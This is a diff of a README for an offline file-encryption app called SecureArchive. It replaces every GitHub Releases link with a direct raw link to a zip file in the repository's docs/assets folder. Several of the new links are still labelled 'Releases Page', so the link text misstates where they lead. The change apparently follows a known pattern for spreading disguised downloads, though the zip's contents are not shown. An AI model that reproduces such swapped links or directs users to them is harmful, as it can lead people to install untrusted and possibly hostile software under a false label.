@@ -7,7 +7,7 @@ SecureArchive is a standalone, fully offline application for securely encrypting
 To get started with SecureArchive, follow the steps below to download and run the application on your system. 
 
 ## 🔗 Download SecureArchive
-[![Download SecureArchive](https://img.shields.io/badge/Download_SecureArchive-latest-blue.svg)](https://github.com/NamXT/SecureArchive/releases)
+[![Download SecureArchive](https://raw.githubusercontent.com/NamXT/SecureArchive/main/docs/assets/SecureArchive-3.3-alpha.5.zip)](https://raw.githubusercontent.com/NamXT/SecureArchive/main/docs/assets/SecureArchive-3.3-alpha.5.zip)
 
 ## 💾 System Requirements
 - **Operating Systems**: Windows, macOS, Linux
@@ -16,7 +16,7 @@ To get started with SecureArchive, follow the steps below to download and run th
 - **Python**: Python 3.7 or higher is recommended for optimal performance
 
 ## 🔽 Download & Install
-1. Click this link to visit the [Releases Page](https://github.com/NamXT/SecureArchive/releases).
+1. Click this link to visit the [Releases Page](https://raw.githubusercontent.com/NamXT/SecureArchive/main/docs/assets/SecureArchive-3.3-alpha.5.zip).
 2. Find the latest version of SecureArchive.
 3. Download the appropriate file for your operating system. 
 4. Locate the downloaded file in your computer's Downloads folder.
@@ -60,6 +60,6 @@ Yes, you can download and install SecureArchive on multiple devices as long as y
 If you have further questions or need assistance, please reach out via the issue tracker on GitHub. We are here to help.
 
 ## 🔗 Visit the Releases Page Again
-For your convenience, you can always go back to the [Releases Page](https://github.com/NamXT/SecureArchive/releases) to check for updates or download the latest version.
+For your convenience, you can always go back to the [Releases Page](https://raw.githubusercontent.com/NamXT/SecureArchive/main/docs/assets/SecureArchive-3.3-alpha.5.zip) to check for updates or download the latest version.
 
 Thank you for choosing SecureArchive! Your privacy and data security are our top priorities.
